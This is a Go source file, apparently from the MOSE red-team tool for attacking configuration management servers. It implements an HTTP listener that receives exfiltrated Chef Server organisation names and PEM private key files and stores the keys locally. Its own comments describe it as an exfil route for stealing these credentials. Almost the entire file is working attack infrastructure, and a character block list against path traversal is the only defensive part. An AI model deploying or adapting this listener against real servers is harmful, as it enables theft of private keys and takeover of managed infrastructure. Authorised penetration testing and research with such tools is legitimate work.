// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"context"
	"encoding/json"
	"github.com/master-of-servers/mose/pkg/moseutils"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

// checkInvalidChars detects invalid (and potentially malicious)
// characters from being used in a file name string
func checkInvalidChars(file string) {
	var disallowedChars = []string{
		"..",
		"~",
		"!",
		"@",
		"#",
		"$",
		"%",
		"^",
		"&",
		"*",
		"(",
		")",
		"+",
		"=",
		"{",
		"}",
		"]",
		"[",
		"|",
		"\\",
		"`",
		",",
		"/",
		"?",
		";",
		":",
		"'",
		"\"",
		"<",
		">"}

	for _, c := range disallowedChars {
		if strings.Contains(file, c) {
			log.Fatalf("Invalid character in the filename: %v", file)
		}
	}
}

// fileUpload is used to upload files to a listener
func fileUpload(w http.ResponseWriter, r *http.Request) {

	// Limit file uploads to 10 MB files
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		log.Println(err)
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		log.Println(err)
		return
	}
	defer file.Close()

	checkInvalidChars(handler.Filename)

	f, err := os.OpenFile("keys/"+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)

	if err != nil {
		log.Println(err)
		return
	}
	defer f.Close()

	if _, err := io.Copy(f, file); err != nil {
		log.Println(err)
		return
	}

	log.Printf("Successfully uploaded %v", handler.Filename)
}

// orgUpload is used to exfil org names from a Chef Server
func orgUpload(w http.ResponseWriter, r *http.Request) {
	type Org struct {
		Name string
	}
	var org Org
	if r.Body == nil {
		http.Error(w, "Please send a request body", 400)
		return
	}
	err := json.NewDecoder(r.Body).Decode(&org)
	if err != nil {
		http.Error(w, err.Error(), 400)
		return
	}
	log.Printf("Successfully uploaded %v", org.Name)
	// TODO support multiple orgs
	targetOrgName = strings.TrimSpace(org.Name)
}

// createUploadRoute is used to create an exfil route
// that can be used to steal org names and pem files from a Chef Server
func createUploadRoute(localIP string, localPort int) {
	timeToServe := 30
	var ip string
	if localIP == "" {
		ip, _ = moseutils.GetLocalIP()
		if ip == "" {
			log.Fatalln("Unable to get local IP address")
		}
	} else {
		ip = localIP
	}
	if _, err := os.Stat("keys"); os.IsNotExist(err) {
		moseutils.CreateFolders([]string{"keys"})
	}

	http.HandleFunc("/upload", fileUpload)
	http.HandleFunc("/org", orgUpload)
	proto := "http"
	if serveSSL {
		proto = "https"
	}
	msg("Listener being served at %s://%s:%d/%s-%s for %d seconds", proto, ip, localPort, cmTarget, osTarget, timeToServe)
	srv := moseutils.StartServer(localPort, "", serveSSL, sslCertPath, sslKeyPath, time.Duration(timeToServe)*time.Second, false)

	info("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatalln(err)
	}
}
